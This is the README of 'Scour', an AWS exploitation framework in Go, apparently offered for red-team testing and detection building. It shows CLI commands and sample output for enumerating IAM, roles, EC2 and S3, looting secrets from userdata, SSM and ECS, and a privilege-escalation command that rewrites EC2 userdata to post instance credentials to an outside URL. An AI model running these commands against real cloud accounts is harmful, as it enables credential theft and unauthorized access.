![](https://github.com/grines/scour/blob/main/scour-demo.gif)

# Scour - AWS Exploitation Framework

Attack AWS

## Status
- This is still an active work in progress. **Lots of Bugs
- Not ready for production

- **Where to file issues**:
[https://github.com/grines/scour/issues](https://github.com/grines/Scour/issues)

- **Maintained by**:
[grines](https://github.com/)

# What is Scour?

Scour is a modern module based AWS exploitation framework written in golang, designed for red team testing and blue team analysis. Scour contains modern techniques that can be used to attack environments or build detections for defense.

# Features
- [X] Command Completion
- [X] Dynamic resource listing
- [X] Command history
- [X] Blue team mode (tags attacks with unique User Agent)

## Installation

Scour is written in golang so its easy to ship around as a binary.

##Gettable
go get github.com/grines/scour

##Build
go build main.go


For a more detailed and user-friendly set of user instructions, please check out the Wiki's [installation guide](https://github.com/grines/scour/wiki/Installation). **coming soon

## Scour's Modules

Scour uses a range modules:
- [X] Operations (2)  [create an anchor](#anchors-in-markdown)
- [X] Enumeration (7)
- [X] Privilege Escalation (3)
- [X] Lateral Movement (2)
- [X] Evasion (5)
- [X] Credential Discovery (4)
- [X] Execution (2)
- [X] Persistance (7)
- [X] Exfiltration (1)

## Notes

* Scour is supported on all Linux/OSX.
* Scour is Open-Source Software and is distributed with a BSD-3-Clause License.

## Getting Started

The first time Scour is launched, 

## Basic Commands in Scour

* `token profile <profile_name> <region>` will list the available aws profiels stored in ~/aws/credentials.
* `token AssumeRole <role_name> <region>` will assume role from same or cross account. ** requires active session
* `help module` will return the applicable help information for the specified module. **help TBD
* `attack evasion <tactic>` will run the specified module with its default parameters.

## Running Scour From the command line

* `scour` will enter cli mode
* `Not Connected <> token profile apiuser us-east-1` sets the session to use for commands that require one
* `Connected <apiuser/us-east-1>` actively connected to an aws profile from (~,/aws/credentials) in (region)
* `Connected <apiuser/us-east-1> attack enum <attack>` tab completion with list available enumeration tactics
* `Connected <apiuser/us-east-1> attack privesc <attack>` tab completion with list available privilege escalation tactics
* `Connected <apiuser/us-east-1> attack lateral <attack>` tab completion with list available lateral tactics
* `Connected <apiuser/us-east-1> attack evasion <attack>` tab completion with list available evasion tactics
* `Connected <apiuser/us-east-1> attack creds <attack>` tab completion with list available credential discovery tactics
* `Connected <apiuser/us-east-1> attack execute <attack>` tab completion with list available execution tactics
* `Connected <apiuser/us-east-1> attack persist <attack>` tab completion with list available persistance tactics
* `Connected <apiuser/us-east-1> attack exfil <attack>` tab completion with list available exfiltration tactics

## Enumeration
![](https://github.com/grines/scour/blob/main/scour-enum.gif)
* `Connected <apiuser/us-east-1> attack enum IAM` IAM discovery
```UA Tracking: exec-env/FhFIm7mvmp/nnK7NmJXNF/iam-enum
+-------------+---------------------+------------------+---------------+--------------+
|    USER     |  MANAGED POLICIES   | INLINE POLICIES  |    GROUPS     | ISPRIVILEGED |
+-------------+---------------------+------------------+---------------+--------------+
| admin       | AdministratorAccess | AllEKSInlineuser | SecurityAudit | true         |
| EC2         | AmazonEC2FullAccess |                  |               | true         |
+-------------+---------------------+------------------+---------------+--------------+
```
* `Connected <apiuser/us-east-1> attack enum Roles` Roles discovery
```
UA Tracking: exec-env/EVSWAyidC4/o18HtFPe1P/role-enum
+------------------------------------------------------------+----------------+-----------------------------------------------------+--------------+
|                            ROLE                            | PRINCIPAL TYPE |                  IDENTITY/SERVICE                   | ISPRIVILEGED |
+------------------------------------------------------------+----------------+-----------------------------------------------------+--------------+
| Amazon_CodeBuild_dW6zqYHT3m                                | AWS            | [arn:aws:iam::861293084598:root                     | true         |
|                                                            |                | codebuild.amazonaws.com]                            |              |
| Amazon_CodeBuild_f2DOFPjMHK                                | Service        | [codebuild.amazonaws.com]                           | true         |
| Amazon_CodeBuild_HS59ko7lxn                                | Service        | [codebuild.amazonaws.com]                           | true         |
+------------------------------------------------------------+----------------+-----------------------------------------------------+--------------+
```
* `Connected <apiuser/us-east-1> attack enum EC2` EC2 discovery
```
UA Tracking: exec-env/EVSWAyidC4/dudqW7y1xb/ec2-enum
+---------------------+-----------------------------------------------------+--------------+----------+---------------+----------------------+--------+---------+--------------+----------+
|     INSTANCEID      |                  INSTANCE PROFILE                   |     VPC      | PUBLICIP |   PRIVATEIP   |   SECURITY GROUPS    | PORTS  |  STATE  | ISPRIVILEGED | ISPUBLIC |
+---------------------+-----------------------------------------------------+--------------+----------+---------------+----------------------+--------+---------+--------------+----------+
| i-0f5604708c0b51429 | None                                                | vpc-7e830c1a | None     | 172.31.53.199 | sg-09fcd28717cf4f512 | 80*    | stopped | false        | true     |
|                     |                                                     |              |          |               |                      | 22*    |         |              |          |
|                     |                                                     |              |          |               |                      | 5000*  |         |              |          |
| i-03657fe3b9decdf51 | arn:aws:iam::861293084598:instance-profile/OrgAdmin | vpc-7e830c1a | None     | 172.31.45.96  | sg-61b1fd07          | All*   | stopped | true         | true     |
|                     |                                                     |              |          |               |                      | 8888*  |         |              |          |
| i-01b265a5fdc45df57 | None                                                | vpc-7e830c1a | None     | 172.31.38.118 | sg-0392f752f9b849d3f | 3389*  | stopped | false        | true     |
| i-0867709d6c0be74d9 | arn:aws:iam::861293084598:instance-profile/OrgAdmin | vpc-7e830c1a | None     | 172.31.39.199 | sg-006543a34d2f70028 | 22*    | stopped | true         | true     |
| i-0d95790b5e7ddff23 | None                                                | vpc-7e830c1a | None     | 172.31.12.57  | sg-e1a50dac          | 33391* | stopped | false        | true     |
+---------------------+-----------------------------------------------------+--------------+----------+---------------+----------------------+--------+---------+--------------+----------+
```
* `Connected <apiuser/us-east-1> attack enum S3` S3 discovery
```
UA Tracking: exec-env/EVSWAyidC4/GDGZaYQOuo/s3-enum
+-------------------------------------------+-----------+-----------+--------------+-------------+---------------------+-------------+-------------+-----------+
|                  BUCKET                   | HASPOLICY | ISWEBSITE | ALLOW PUBLIC | PERMISSIONS | ALLOW AUTHENTICATED | PERMISSIONS | REPLICATION |  REGION   |
+-------------------------------------------+-----------+-----------+--------------+-------------+---------------------+-------------+-------------+-----------+
| amazon-conn********3d79b01a               | false     | false     | false        |             | false               |             | false       | us-west-2 |
| aws-cloudtrail-logs-**********98-cb39df0d | true      | false     | false        |             | false               |             | false       |           |
| bullsecu*********                         | true      | true      | false        |             | false               |             | false       |           |
| connect-6ec*****ad67                      | false     | false     | false        |             | false               |             | false       |           |
| connect-******5337c3                      | false     | false     | false        |             | false               |             | false       |           |
| ransom********                            | true      | false     | false        |             | false               |             | false       |           |
| red********                               | false     | false     | false        |             | false               |             | false       |           |
| rep-*****                                 | false     | false     | false        |             | false               |             | false       | us-west-2 |
| terraform*******                          | false     | false     | false        |             | false               |             | false       |           |
+-------------------------------------------+-----------+-----------+--------------+-------------+---------------------+-------------+-------------+-----------+
```
* `Connected <apiuser/us-east-1> attack enum Groups` Groups discovery
```
UA Tracking: exec-env/EVSWAyidC4/jAIKVdESpU/groups-enum
+-----------------------------------------------+---------------------+--------------+-----------------+--------------+
|                     GROUP                     |      POLICIES       | ISPRIVILEGED | INLINE POLICIES | ISPRIVILEGED |
+-----------------------------------------------+---------------------+--------------+-----------------+--------------+
| EC2                                           | SecurityAudit       | false        |                 | false        |
| OpsWorks-dac9e9ba-8b3d-4e04-9ad9-d988ca4c0731 |                     | false        |                 | false        |
| TestGroup                                     | AmazonEC2FullAccess | true         |                 | false        |
|                                               | SecurityAudit       |              |                 |              |
+-----------------------------------------------+---------------------+--------------+-----------------+--------------+
```
* `Connected <apiuser/us-east-1> attack enum Network` Network discovery
```
TBD
```

## Privilege Escalation
![](https://github.com/grines/scour/blob/main/scour-privesc.gif)
* `Connected <apiuser/us-east-1> attack privesc UserData i-0f5604708c0b51429 http://url.to.capture.post.data` steal metadata credentials from EC2. Stop instance / Update userdata to post credentials to supplied url / Start instance (sends EC2 token to URL.)
```
[Sun May  9 06:10:16 2021]  INF  Stopping Instance i-0f5604708c0b51429 - State: stopped
[Sun May  9 06:10:46 2021]  INF  Modifying Instance Attribute UserData on i-0f5604708c0b51429
[Sun May  9 06:10:47 2021]  INF  Starting Instance i-0f5604708c0b51429 - State: pending
```

## Credential Discovery
![](https://github.com/grines/scour/blob/main/scour-creds.gif)
* `Connected <apiuser/us-east-1> attack creds UserData` loot credentials from EC2 userdata
```
UA Tracking: exec-env/yzaqX9HFvP/oL1oho99ZP/userdata-creds
+---------------------+------------------+-------------------------------------------------------------------------------+
|     INSTANCEID      |       RULE       |                                    FINDING                                    |
+---------------------+------------------+-------------------------------------------------------------------------------+
| i-0f5604708c0b51429 | Slack Webhook    | https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX |
| i-0f5604708c0b51429 | Generic Password | password=thisisapassword                                                      |
+---------------------+------------------+-------------------------------------------------------------------------------+
```
* `Connected <apiuser/us-east-1> attack creds SSM` loot credentials from Systems Manager
```
UA Tracking: exec-env/yzaqX9HFvP/FASongUCcG/ssm-params-creds
+------------+----------+----------------------+
| PARAM NAME | DATATYPE |        VALUE         |
+------------+----------+----------------------+
| Test       | text     | thismightbeapassword |
+------------+----------+----------------------+
```
* `Connected <apiuser/us-east-1> attack creds ECS` loot credentials from ECS
```
UA Tracking: exec-env/9tsJFrIPmw/rEGaMfF5AI/ecs-creds
+-------------+-------+------------+
| ENVARS NAME | VALUE | DEFINITION |
+-------------+-------+------------+
| Secret      | heere | sample-app |
+-------------+-------+------------+
```
## Disclaimers, and the AWS Acceptable Use Policy

* To the best of our knowledge Scour's capabilities are compliant with the AWS Acceptable Use Policy, but as a flexible and modular tool, we cannot guarantee this will be true in every situation. It is entirely your responsibility to ensure that how you use Scour is compliant with the AWS Acceptable Use Policy.
* Depending on what AWS services you use and what your planned testing entails, you may need to [request authorization from Amazon](https://aws.amazon.com/security/penetration-testing/) before actually running Scour against your infrastructure. Determining whether or not such authorization is necessary is your responsibility.
* As with any penetration testing tool, it is your responsibility to get proper authorization before using Scour outside of your environment.
* Scour is software that comes with absolutely no warranties whatsoever. By using Scour, you take full responsibility for any and all outcomes that result.
